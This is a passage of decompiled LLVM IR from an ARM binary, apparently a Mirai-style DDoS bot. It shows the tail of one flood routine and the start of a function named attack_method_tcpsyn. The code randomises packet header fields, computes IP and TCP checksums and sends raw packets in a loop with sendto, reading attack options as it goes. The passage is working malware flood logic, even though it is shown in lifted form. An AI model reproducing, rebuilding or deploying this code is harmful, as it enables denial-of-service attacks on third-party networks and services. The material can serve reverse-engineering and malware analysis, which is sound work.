  %v2_bfb0 = inttoptr i32 %v1_bfb0 to i8*
  %v3_bfb0 = load i8, i8* %v2_bfb0, align 1
  %v4_bfb0 = zext i8 %v3_bfb0 to i32
  store i32 %v4_bfb0, i32* %r2.global-to-local, align 4
  %v4_bfb4 = mul i32 %v1_bfb4, 4
  %v5_bfb4 = add i32 %v4_bfb4, %v2_bb00
  %v6_bfb4 = inttoptr i32 %v5_bfb4 to i32*
  %v7_bfb4 = load i32, i32* %v6_bfb4, align 4
  store i32 %v7_bfb4, i32* @r5, align 4
  %v7_bfb8 = icmp eq i8 %v3_bfb0, 31
  store i1 %v7_bfb8, i1* %cpsr_z.global-to-local, align 1
  %v1_bfbc = add i32 %v7_bfb4, 20
  store i32 %v1_bfbc, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_bfb0, 32
  br i1 %tmp77, label %dec_label_pc_c0b8, label %dec_label_pc_bfc4

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bfa0
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_bfd0:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_bfe4

dec_label_pc_bfe4:                                ; preds = %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge, %dec_label_pc_bfd0
  %v1_bfe8 = phi i32 [ %v1_bfe8.pre, %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge ], [ 65535, %dec_label_pc_bfd0 ]
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v9_bfe8 = icmp eq i32 %v3_bd30, %v1_bfe8
  store i1 %v9_bfe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfe8, label %dec_label_pc_c148, label %dec_label_pc_bff0

dec_label_pc_bff0:                                ; preds = %dec_label_pc_c134.dec_label_pc_bff0_crit_edge, %dec_label_pc_bfe4
  %v1_bff4 = phi i32 [ %v1_bff4.pre, %dec_label_pc_c134.dec_label_pc_bff0_crit_edge ], [ %v1_bfe8, %dec_label_pc_bfe4 ]
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v9_bff4 = icmp eq i32 %v3_bd34, %v1_bff4
  store i1 %v9_bff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bff4, label %dec_label_pc_c15c, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_c148.dec_label_pc_bffc_crit_edge, %dec_label_pc_bff0
  %v1_c000 = phi i32 [ %v1_c000.pre, %dec_label_pc_c148.dec_label_pc_bffc_crit_edge ], [ %v1_bff4, %dec_label_pc_bff0 ]
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v9_c000 = icmp eq i32 %v5_bbd0, %v1_c000
  store i1 %v9_c000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c000, label %dec_label_pc_c170, label %dec_label_pc_c008

dec_label_pc_c008:                                ; preds = %dec_label_pc_c15c.dec_label_pc_c008_crit_edge, %dec_label_pc_bffc
  %v1_c00c = phi i32 [ %v1_c00c.pre, %dec_label_pc_c15c.dec_label_pc_c008_crit_edge ], [ %v1_c000, %dec_label_pc_bffc ]
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v9_c00c = icmp eq i32 %v6_bbec, %v1_c00c
  store i1 %v9_c00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c00c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c014:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c020:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184, %dec_label_pc_c198
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c024 = load i32, i32* @r5, align 4
  %v3_c024 = add i32 %v2_c024, 10
  %v4_c024 = inttoptr i32 %v3_c024 to i16*
  store i16 0, i16* %v4_c024, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c02c = load i32, i32* @r5, align 4
  store i32 %v0_c02c, i32* @r0, align 4
  %v2_c030 = call i32 @checksum_generic(i32 %v0_c02c, i32 20)
  %v3_c030 = trunc i32 %v2_c030 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c038 = load i32, i32* @r5, align 4
  %v4_c038 = add i32 %v3_c038, 10
  %v5_c038 = inttoptr i32 %v4_c038 to i16*
  store i16 %v3_c030, i16* %v5_c038, align 2
  %v0_c03c = load i32, i32* @r6, align 4
  store i32 %v0_c03c, i32* @r1, align 4
  %v0_c040 = load i32, i32* %r3.global-to-local, align 4
  %v1_c040 = trunc i32 %v0_c040 to i16
  %v3_c040 = add i32 %v0_c03c, 16
  %v4_c040 = inttoptr i32 %v3_c040 to i16*
  store i16 %v1_c040, i16* %v4_c040, align 2
  %v0_c044 = load i32, i32* @sl, align 4
  store i32 %v0_c044, i32* %r2.global-to-local, align 4
  %v0_c048 = load i32, i32* @sb, align 4
  store i32 %v0_c048, i32* %r3.global-to-local, align 4
  %v0_c04c = load i32, i32* @r5, align 4
  store i32 %v0_c04c, i32* %r0.global-to-local, align 4
  %v4_c050 = call i32 @checksum_tcpudp(i32 %v0_c04c, i32 %v0_c03c, i32 %v0_c044, i32 %v0_c048)
  %v5_c050 = trunc i32 %v4_c050 to i16
  store i32 %v4_c050, i32* %r0.global-to-local, align 4
  %v3_c054 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c054, i32* %r3.global-to-local, align 4
  %v3_c058 = mul i32 %v3_c054, 32
  store i32 %v3_c058, i32* %lr.global-to-local, align 4
  %v3_c05c = load i32, i32* @r6, align 4
  %v4_c05c = add i32 %v3_c05c, 16
  %v5_c05c = inttoptr i32 %v4_c05c to i16*
  store i16 %v5_c050, i16* %v5_c05c, align 2
  %v0_c060 = load i32, i32* %lr.global-to-local, align 4
  %v1_c060 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_c060, -8
  %v5_c060 = add i32 %v0_c060, %tmp78
  store i32 %v5_c060, i32* %lr.global-to-local, align 4
  %v0_c064 = load i32, i32* @r6, align 4
  %v1_c064 = add i32 %v0_c064, 2
  %v2_c064 = inttoptr i32 %v1_c064 to i16*
  %v3_c064 = load i16, i16* %v2_c064, align 2
  %v4_c064 = zext i16 %v3_c064 to i32
  store i32 %v4_c064, i32* @r6, align 4
  %v1_c068 = load i32, i32* @r8, align 4
  %v2_c068 = add i32 %v1_c068, %v5_c060
  store i32 %v2_c068, i32* @lr, align 4
  %v3_c06c = add i32 %v2_c068, 2
  %v4_c06c = inttoptr i32 %v3_c06c to i16*
  store i16 %v3_c064, i16* %v4_c06c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c078 = load i32, i32* @r5, align 4
  store i32 %v0_c078, i32* %r1.global-to-local, align 4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v0_c080 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c080, i32* %r2.global-to-local, align 4
  %v0_c084 = load i32, i32* @lr, align 4
  %v6_c08c = call i32 @__libc_sendto(i32 %v3_bce4, i32 %v0_c078, i32 %v0_c080, i32 16384, i32 %v0_c084, i32 16)
  %v3_c090 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c090, i32* %r3.global-to-local, align 4
  %v1_c094 = add i32 %v3_c090, 1
  store i32 %v1_c094, i32* %r0.global-to-local, align 4
  %v1_c098 = load i32, i32* @r7, align 4
  %v9_c098 = icmp eq i32 %v1_c094, %v1_c098
  store i1 %v9_c098, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c094, i32* %stack_var_-44, align 4
  %v5_c0a0 = icmp slt i32 %v1_c094, %v1_c098
  br i1 %v5_c0a0, label %dec_label_pc_bfa0, label %dec_label_pc_c0a4

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c020
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c0a8 = icmp eq i32 %v1_c098, 0
  store i1 %v2_c0a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c0a8, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_c0b8:                                ; preds = %dec_label_pc_bfa0
  %v1_c0b8 = add i32 %v2_bfa8, 16
  %v2_c0b8 = inttoptr i32 %v1_c0b8 to i32*
  %v3_c0b8 = load i32, i32* %v2_c0b8, align 4
  %v0_c0bc = call i32 @rand_next()
  store i32 %v0_c0bc, i32* %r0.global-to-local, align 4
  %v3_c0c0 = load i32, i32* %stack_var_-44, align 4
  %v5_c0c8 = mul i32 %v3_c0c0, 24
  %v1_c0cc = and i32 %v3_c0b8, 16711680
  store i32 %v1_c0cc, i32* %ip.global-to-local, align 4
  %v3_c0d0 = udiv i32 %v3_c0b8, 16777216
  %v4_c0d4 = udiv i32 %v1_c0cc, 256
  %v5_c0d4 = or i32 %v4_c0d4, %v3_c0d0
  store i32 %v5_c0d4, i32* %r2.global-to-local, align 4
  %v1_c0d8 = load i32, i32* @r8, align 4
  %v2_c0d8 = add i32 %v1_c0d8, %v5_c0c8
  store i32 %v2_c0d8, i32* %r1.global-to-local, align 4
  %v1_c0dc = and i32 %v3_c0b8, 65280
  store i32 %v1_c0dc, i32* %r3.global-to-local, align 4
  %v1_c0e0 = add i32 %v2_c0d8, 20
  %v2_c0e0 = inttoptr i32 %v1_c0e0 to i8*
  %v3_c0e0 = load i8, i8* %v2_c0e0, align 1
  %v4_c0e0 = zext i8 %v3_c0e0 to i32
  store i32 %v4_c0e0, i32* %ip.global-to-local, align 4
  %v5_c0e8 = call i32 @llvm.bswap.i32(i32 %v3_c0b8)
  %v7_c0ec = lshr i32 %v0_c0bc, %v4_c0e0
  %v8_c0ec = add i32 %v7_c0ec, %v5_c0e8
  store i32 %v8_c0ec, i32* %r2.global-to-local, align 4
  %v1_c0fc = and i32 %v8_c0ec, 65280
  store i32 %v1_c0fc, i32* %r1.global-to-local, align 4
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  %v5_c108 = call i32 @llvm.bswap.i32(i32 %v8_c0ec)
  store i32 %v5_c108, i32* %r3.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  %v1_c110 = load i32, i32* @r5, align 4
  %v2_c110 = add i32 %v1_c110, 16
  %v3_c110 = inttoptr i32 %v2_c110 to i32*
  store i32 %v5_c108, i32* %v3_c110, align 4
  br i1 %v2_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_c118:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  %v0_c118 = call i32 @rand_next()
  store i32 %v0_c118, i32* %r0.global-to-local, align 4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  %v1_c12c = load i32, i32* @r5, align 4
  %v2_c12c = add i32 %v1_c12c, 12
  %v3_c12c = inttoptr i32 %v2_c12c to i32*
  store i32 %v0_c118, i32* %v3_c12c, align 4
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge

dec_label_pc_c118.dec_label_pc_bfe4_crit_edge:    ; preds = %dec_label_pc_c118
  %v1_bfe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfe4

dec_label_pc_c134:                                ; preds = %dec_label_pc_c118, %dec_label_pc_bfd0
  %v0_c134 = call i32 @rand_next()
  %v1_c134 = trunc i32 %v0_c134 to i16
  store i32 %v0_c134, i32* %r0.global-to-local, align 4
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v1_c13c = load i32, i32* @r4, align 4
  %v9_c13c = icmp eq i32 %v3_bd30, %v1_c13c
  store i1 %v9_c13c, i1* %cpsr_z.global-to-local, align 1
  %v3_c140 = load i32, i32* @r5, align 4
  %v4_c140 = add i32 %v3_c140, 4
  %v5_c140 = inttoptr i32 %v4_c140 to i16*
  store i16 %v1_c134, i16* %v5_c140, align 2
  br i1 %v9_c13c, label %dec_label_pc_c148, label %dec_label_pc_c134.dec_label_pc_bff0_crit_edge

dec_label_pc_c134.dec_label_pc_bff0_crit_edge:    ; preds = %dec_label_pc_c134
  %v1_bff4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bff0

dec_label_pc_c148:                                ; preds = %dec_label_pc_c134, %dec_label_pc_bfe4
  %v0_c148 = call i32 @rand_next()
  %v1_c148 = trunc i32 %v0_c148 to i16
  store i32 %v0_c148, i32* %r0.global-to-local, align 4
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v1_c150 = load i32, i32* @r4, align 4
  %v9_c150 = icmp eq i32 %v3_bd34, %v1_c150
  store i1 %v9_c150, i1* %cpsr_z.global-to-local, align 1
  %v3_c154 = load i32, i32* @r5, align 4
  %v4_c154 = add i32 %v3_c154, 20
  %v5_c154 = inttoptr i32 %v4_c154 to i16*
  store i16 %v1_c148, i16* %v5_c154, align 2
  br i1 %v9_c150, label %dec_label_pc_c15c, label %dec_label_pc_c148.dec_label_pc_bffc_crit_edge

dec_label_pc_c148.dec_label_pc_bffc_crit_edge:    ; preds = %dec_label_pc_c148
  %v1_c000.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bffc

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c148, %dec_label_pc_bff0
  %v0_c15c = call i32 @rand_next()
  %v1_c15c = trunc i32 %v0_c15c to i16
  store i32 %v0_c15c, i32* %r0.global-to-local, align 4
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v1_c164 = load i32, i32* @r4, align 4
  %v9_c164 = icmp eq i32 %v5_bbd0, %v1_c164
  store i1 %v9_c164, i1* %cpsr_z.global-to-local, align 1
  %v3_c168 = load i32, i32* @r6, align 4
  %v4_c168 = add i32 %v3_c168, 2
  %v5_c168 = inttoptr i32 %v4_c168 to i16*
  store i16 %v1_c15c, i16* %v5_c168, align 2
  br i1 %v9_c164, label %dec_label_pc_c170, label %dec_label_pc_c15c.dec_label_pc_c008_crit_edge

dec_label_pc_c15c.dec_label_pc_c008_crit_edge:    ; preds = %dec_label_pc_c15c
  %v1_c00c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c008

dec_label_pc_c170:                                ; preds = %dec_label_pc_c15c, %dec_label_pc_bffc
  %v0_c170 = call i32 @rand_next()
  %v1_c174 = load i32, i32* @r6, align 4
  %v2_c174 = add i32 %v1_c174, 4
  %v3_c174 = inttoptr i32 %v2_c174 to i32*
  store i32 %v0_c170, i32* %v3_c174, align 4
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v1_c17c = load i32, i32* @r4, align 4
  %v9_c17c = icmp eq i32 %v6_bbec, %v1_c17c
  store i1 %v9_c17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c17c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c184:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  %v0_c184 = call i32 @rand_next()
  store i32 %v0_c184, i32* %r0.global-to-local, align 4
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  %v1_c190 = load i32, i32* @r6, align 4
  %v2_c190 = add i32 %v1_c190, 8
  %v3_c190 = inttoptr i32 %v2_c190 to i32*
  store i32 %v0_c184, i32* %v3_c190, align 4
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c198:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184
  %v0_c198 = load i32, i32* @r5, align 4
  %v1_c198 = add i32 %v0_c198, 40
  store i32 %v1_c198, i32* %r0.global-to-local, align 4
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v2_c1a0 = inttoptr i32 %v1_c198 to i16*
  %v3_c1a0 = call i32 @rand_str(i16* %v2_c1a0, i32 %v6_bc94)
  store i32 %v3_c1a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c020

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_bcf4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v1_c1ac = call i32 @__GI___libc_close(i32 %v3_bce4)
  store i32 %v1_c1ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1b0

dec_label_pc_c1b0:                                ; preds = %entry, %dec_label_pc_c1a8
  %v1_c1b8 = phi i32 [ %v3_bce4, %entry ], [ %v1_c1ac, %dec_label_pc_c1a8 ]
  store i32 %v18_bae4, i32* %sb.global-to-local, align 4
  store i32 %v24_bae4, i32* %fp.global-to-local, align 4
  store i32 %v27_bae4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1b8

dec_label_pc_c1bc:                                ; preds = %dec_label_pc_bd1c
  store i32 %v6_bc94, i32* %r0.global-to-local, align 4
  %v1_c1c4 = add i32 %v6_bc94, 20
  store i32 %v1_c1c4, i32* @sb, align 4
  %v3_c1c8 = mul i32 %v6_bc94, 65536
  store i32 %v3_c1c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bf78

; uselistorder directives
  uselistorder i32 %v0_c15c, { 1, 0 }
  uselistorder i32 %v0_c148, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 0 }
  uselistorder i32 %v5_c108, { 1, 0 }
  uselistorder i32 %v3_c0b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c094, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c060, { 1, 0 }
  uselistorder i32 %v4_c050, { 1, 0 }
  uselistorder i1 %v7_bfc8, { 2, 1, 0 }
  uselistorder i1 %v2_c18c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c128, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_bf5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bf30, { 1, 0 }
  uselistorder i32 %v1_bde4, { 1, 2, 0 }
  uselistorder i32 %v1_bde0, { 2, 1, 0 }
  uselistorder i32 %v1_bddc, { 2, 0, 1 }
  uselistorder i32 %v1_bdd8, { 2, 0, 1 }
  uselistorder i32 %v1_bdd4, { 2, 0, 1 }
  uselistorder i32 %v1_bdac, { 1, 0 }
  uselistorder i32 %v3_bd54, { 1, 0 }
  uselistorder i32 %v3_bd2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bd24, { 1, 0, 2 }
  uselistorder i32 %v0_bd20, { 1, 0, 2 }
  uselistorder i32 %v0_bd1c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bd14, { 1, 0 }
  uselistorder i1 %v7_bce8, { 1, 0 }
  uselistorder i32 %v3_bce4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_bcd0, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_bcbc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bc94, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bbec, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bbd0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bb80, { 1, 0 }
  uselistorder i32 %v2_bb00, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i16 64, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c1b0, { 1, 0 }
  uselistorder label %dec_label_pc_c198, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bf9c, { 1, 0 }
  uselistorder label %dec_label_pc_bf8c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_tcpsyn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c1dc = load i32, i32* @r4, align 4
  %v24_c1dc = load i32, i32* @fp, align 4
  %v27_c1dc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c1f8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1fc = load i32, i32* @r5, align 4
  store i32 %v0_c1fc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c1f8, i32* @sb, align 4
  %v0_c20c = load i32, i32* @r4, align 4
  store i32 %v0_c20c, i32* %r0.global-to-local, align 4
  %v4_c210 = inttoptr i32 %v0_c1fc to i32*
  %v5_c210 = call i32 @attack_get_opt_int(i32 %v0_c20c, i32* %v4_c210, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c228 = load i32, i32* @r5, align 4
  store i32 %v0_c228, i32* %r1.global-to-local, align 4
  %v0_c22c = load i32, i32* @r4, align 4
  store i32 %v0_c22c, i32* %r0.global-to-local, align 4
  %v5_c230 = trunc i32 %v5_c210 to i8
  %v6_c234 = inttoptr i32 %v0_c228 to i32*
  %v7_c234 = call i32 @attack_get_opt_int(i32 %v0_c22c, i32* %v6_c234, i32 3, i32 65535)
  %v0_c238 = load i32, i32* @r5, align 4
  store i32 %v0_c238, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c248 = load i32, i32* @r4, align 4
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  %v5_c24c = inttoptr i32 %v0_c238 to i32*
  %v6_c24c = call i32 @attack_get_opt_int(i32 %v0_c248, i32* %v5_c24c, i32 4, i32 64)
  %v1_c254 = urem i32 %v6_c24c, 256
  %v0_c258 = load i32, i32* @r5, align 4
  store i32 %v0_c258, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c264 = load i32, i32* @r4, align 4
  store i32 %v0_c264, i32* %r0.global-to-local, align 4
  %v6_c26c = inttoptr i32 %v0_c258 to i32*
  %v7_c26c = call i32 @attack_get_opt_int(i32 %v0_c264, i32* %v6_c26c, i32 5, i32 1)
  %v1_c278 = urem i32 %v7_c26c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c284 = load i32, i32* @r5, align 4
  store i32 %v0_c284, i32* %r1.global-to-local, align 4
  %v0_c288 = load i32, i32* @r4, align 4
  store i32 %v0_c288, i32* %r0.global-to-local, align 4
  %v5_c290 = inttoptr i32 %v0_c284 to i32*
  %v6_c290 = call i32 @attack_get_opt_int(i32 %v0_c288, i32* %v5_c290, i32 6, i32 65535)
  %v0_c298 = load i32, i32* @r5, align 4
  store i32 %v0_c298, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c290, i32* %fp.global-to-local, align 4
  %v0_c2a8 = load i32, i32* @r4, align 4
  store i32 %v0_c2a8, i32* %r0.global-to-local, align 4
  %v4_c2ac = inttoptr i32 %v0_c298 to i32*
  %v5_c2ac = call i32 @attack_get_opt_int(i32 %v0_c2a8, i32* %v4_c2ac, i32 7, i32 65535)
  %v0_c2b4 = load i32, i32* @r5, align 4
  store i32 %v0_c2b4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c2ac, i32* @r6, align 4
  %v0_c2c4 = load i32, i32* @r4, align 4
  store i32 %v0_c2c4, i32* %r0.global-to-local, align 4
  %v4_c2c8 = inttoptr i32 %v0_c2b4 to i32*
  %v5_c2c8 = call i32 @attack_get_opt_int(i32 %v0_c2c4, i32* %v4_c2c8, i32 17, i32 65535)
  %v0_c2cc = load i32, i32* @r5, align 4
  store i32 %v0_c2cc, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r4, align 4
  store i32 %v0_c2dc, i32* %r0.global-to-local, align 4
  %v5_c2e0 = inttoptr i32 %v0_c2cc to i32*
  %v6_c2e0 = call i32 @attack_get_opt_int(i32 %v0_c2dc, i32* %v5_c2e0, i32 18, i32 0)
  %v0_c2e4 = load i32, i32* @r5, align 4
  store i32 %v0_c2e4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2f4 = load i32, i32* @r4, align 4
  store i32 %v0_c2f4, i32* %r0.global-to-local, align 4
  %v5_c2f8 = inttoptr i32 %v0_c2e4 to i32*
  %v6_c2f8 = call i32 @attack_get_opt_int(i32 %v0_c2f4, i32* %v5_c2f8, i32 11, i32 0)
  %v0_c2fc = load i32, i32* @r5, align 4
  store i32 %v0_c2fc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c30c = load i32, i32* @r4, align 4
  store i32 %v0_c30c, i32* %r0.global-to-local, align 4
  %v5_c310 = inttoptr i32 %v0_c2fc to i32*
  %v6_c310 = call i32 @attack_get_opt_int(i32 %v0_c30c, i32* %v5_c310, i32 12, i32 0)
  %v0_c314 = load i32, i32* @r5, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c324 = load i32, i32* @r4, align 4
  store i32 %v0_c324, i32* %r0.global-to-local, align 4
  %v5_c328 = inttoptr i32 %v0_c314 to i32*
  %v6_c328 = call i32 @attack_get_opt_int(i32 %v0_c324, i32* %v5_c328, i32 13, i32 0)
  %v0_c32c = load i32, i32* @r5, align 4
  store i32 %v0_c32c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v5_c340 = inttoptr i32 %v0_c32c to i32*
  %v6_c340 = call i32 @attack_get_opt_int(i32 %v0_c33c, i32* %v5_c340, i32 14, i32 0)
  %v0_c344 = load i32, i32* @r5, align 4
  store i32 %v0_c344, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c354 = load i32, i32* @r4, align 4
  store i32 %v0_c354, i32* %r0.global-to-local, align 4
  %v5_c358 = inttoptr i32 %v0_c344 to i32*
  %v6_c358 = call i32 @attack_get_opt_int(i32 %v0_c354, i32* %v5_c358, i32 15, i32 1)
  %v0_c35c = load i32, i32* @r5, align 4
  store i32 %v0_c35c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
